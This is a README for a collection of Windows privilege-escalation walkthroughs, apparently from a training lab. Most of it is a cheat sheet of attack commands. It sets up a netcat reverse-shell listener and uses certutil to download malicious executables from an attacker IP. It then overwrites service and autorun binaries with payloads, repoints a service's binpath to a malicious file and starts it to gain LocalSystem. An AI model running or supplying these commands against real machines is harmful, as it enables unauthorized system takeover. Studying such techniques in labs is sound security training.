*This dirctory contians explanations and walk throughs on the following windows privesc methods*

- Buffer Overflow
- DLL Injection 
- DLL Hijacking 
- Token Manipulation 
- Insecure Files Permission 
- Insecure Folders Permission
- Insecure Service Permission
- Insecure Registery Permission
- Runas
- AlwaysInstallElevated 
- Unquoted Service Paths
- Kernel Exploitation
- Stored Password 
- Runas Admin
- UAC Bypass




## List of Commands Used in the Privilege Escalation PoCs

### 1. Initial Access and Setup
**Use Case**: Commands used to gain initial access to the target system and set up the environment for exploitation, such as establishing a reverse shell or downloading malicious files.

- **Set up a listener on the attacker machine to capture reverse shell connections**:  
  ```bash
  nc -nlvp 2294
  ```
  - Used in "Insecure Service Executables" to listen for incoming connections from the target.

- **Download a malicious file (`esc.exe`, `x.exe`) to the target machine**:  
  ```bash
  certutil -urlcache -split -f http://10.4.106.235/esc.exe
  ```
  ```bash
  certutil -urlcache -split -f http://10.4.106.235/x.exe
  ```
  - Used in "Insecure Service Executables" to download `esc.exe` and `x.exe` for exploitation.

---

### 2. Service and Autorun Enumeration
**Use Case**: Commands used to gather information about services or autorun programs, such as their configuration, privilege level, or binary paths.

- **Query a service to check its configuration and privilege level**:  
  ```bash
  sc qc filepermsvc
  ```
  - Used in "Insecure Service Executables" to confirm `filepermsvc` runs as `LocalSystem`.

  ```bash
  sc qc daclsvc
  ```
  - Used in "Insecure Service Permissions" to confirm `daclsvc` runs as `LocalSystem`.

- **Query the Windows Registry to identify autorun programs**:  
  ```bash
  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
  ```
  - Used in "Insecure Autoruns" to find autorun programs configured to start automatically.

- **Use WMIC to list startup programs and their commands**:  
  ```bash
  wmic startup get caption,command
  ```
  - Used in "Insecure Autoruns" as an alternative method to identify autorun programs.

---

### 3. Permission Analysis
**Use Case**: Commands used to analyze permissions on services or binaries to identify vulnerabilities (e.g., write access for unprivileged users).

- **Check permissions on a service binary**:  
  ```bash
  C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
  ```
  - Used in "Insecure Service Executables" to confirm `BUILTIN\Users` has `FILE_ALL_ACCESS`.

- **Check permissions on an autorun binary**:  
  ```bash
  C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
  ```
  - Used in "Insecure Autoruns" to confirm the `Everyone` group has write access.

- **Check user permissions on a service**:  
  ```bash
  C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
  ```
  - Used in "Insecure Service Permissions" to confirm the `user` account has `SERVICE_CHANGE_CONFIG` permissions.

---

### 4. File Manipulation
**Use Case**: Commands used to replace legitimate binaries with malicious ones to facilitate privilege escalation.

- **Replace a service binary with a malicious file**:  
  ```bash
  copy esc.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
  ```
  ```bash
  copy x.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
  ```
  - Used in "Insecure Service Executables" to replace `filepermservice.exe` with `esc.exe` or `x.exe`.

- **Replace an autorun binary with a malicious file**:  
  ```bash
  copy C:\Users\user\esc.exe "C:\Program Files\Autorun Program\program.exe" /Y
  ```
  - Used in "Insecure Autoruns" to replace `program.exe` with `esc.exe`.

---

### 5. Service Configuration Modification
**Use Case**: Commands used to modify a service's configuration, such as changing its binary path to point to a malicious file.

- **Modify a service's binary path to point to a malicious file**:  
  ```bash
  sc config daclsvc binpath= "\"C:\users\user\esc.exe\""
  ```
  ```bash
  sc config daclsvc binpath= "C:\Users\user\malicious.exe"
  ```
  - Used in "Insecure Service Permissions" to redirect the `daclsvc` service to execute `esc.exe` or `malicious.exe`.

---

### 6. Service Execution
**Use Case**: Commands used to start a service, triggering the execution of the malicious binary and completing the exploit.

- **Start a service to execute the malicious binary**:  
  ```bash
  net start filepermsvc
  ```
  - Used in "Insecure Service Executables" to execute the replaced binary (`esc.exe` or `x.exe`).

  ```bash
  net start daclsvc
  ```
  - Used in "Insecure Service Permissions" to execute the modified binary (`esc.exe`).

---

### Summary of Categories
- **Initial Access and Setup**: Commands to establish a foothold on the target system (`nc`, `certutil`).  
- **Service and Autorun Enumeration**: Commands to identify vulnerable services or autorun programs (`sc qc`, `reg query`, `wmic`).  
- **Permission Analysis**: Commands to verify exploitable permissions (`accesschk`).  
- **File Manipulation**: Commands to replace binaries with malicious files (`copy`).  
- **Service Configuration Modification**: Commands to alter service configurations (`sc config`).  
- **Service Execution**: Commands to trigger the exploit by starting the service (`net start`).

